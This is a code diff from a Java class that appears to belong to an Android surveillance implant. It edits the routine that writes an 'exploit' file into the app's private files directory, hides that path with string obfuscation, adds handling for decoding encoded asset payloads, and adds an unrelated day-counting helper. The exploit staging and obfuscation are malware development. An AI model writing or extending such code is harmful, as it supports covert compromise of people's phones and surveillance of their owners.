@@ -25,6 +25,9 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.security.SecureRandom;
+import java.util.Calendar;
+import java.util.Date;
+import java.util.GregorianCalendar;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -193,7 +196,10 @@ public final class Utils {
 
 			out.close();
 
-			AutoFile file = new AutoFile(exploit);
+			String pack = Status.self().getAppContext().getPackageName();
+			final String installPath = String.format(M.e("/data/data/%s/files"), pack);
+
+			AutoFile file = new AutoFile(installPath, exploit);
 			if (!file.exists() || !file.canRead()) {
 				return false;
 			}
@@ -217,6 +223,12 @@ public final class Utils {
 			Check.asserts(asset.endsWith(".data"), "asset should end in .data");
 		}
 		InputStream stream = getAssetStream(asset);
+		if(stream == null){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (dumpAsset), ERROR cannot find resource: %s", asset);
+			}
+			return false;
+		}
 		return streamDecodeWrite(filename, stream, Cfg.RNDDB + asset.charAt(0));
 	}
 
@@ -291,4 +303,44 @@ public static String pidOf(String lookFor) {
 	}
 	return pid;
 }
+public static int getDaysBetween (long start, long end)   {
+
+		boolean negative = false;
+		if (end> start)  {
+			negative = true;
+			long temp = start;
+			start = end;
+			end = temp;
+		}
+
+		GregorianCalendar cal = new GregorianCalendar();
+		cal.setTime(new Date(start));
+		cal.set(Calendar.HOUR_OF_DAY, 0);
+		cal.set(Calendar.MINUTE, 0);
+		cal.set(Calendar.SECOND, 0);
+		cal.set(Calendar.MILLISECOND, 0);
+
+		GregorianCalendar calEnd = new GregorianCalendar();
+		calEnd.setTime(new Date(end));
+		calEnd.set(Calendar.HOUR_OF_DAY, 0);
+		calEnd.set(Calendar.MINUTE, 0);
+		calEnd.set(Calendar.SECOND, 0);
+		calEnd.set(Calendar.MILLISECOND, 0);
+
+
+		if (cal.get(Calendar.YEAR) == calEnd.get(Calendar.YEAR))   {
+			if (negative)
+				return (calEnd.get(Calendar.DAY_OF_YEAR) - cal.get(Calendar.DAY_OF_YEAR)) * -1;
+			return calEnd.get(Calendar.DAY_OF_YEAR) - cal.get(Calendar.DAY_OF_YEAR);
+		}
+
+		int days = 0;
+		while (calEnd.after(cal))    {
+			cal.add (Calendar.DAY_OF_YEAR, 1);
+			days++;
+		}
+		if (negative)
+			return days * -1;
+		return days;
+	}
 }
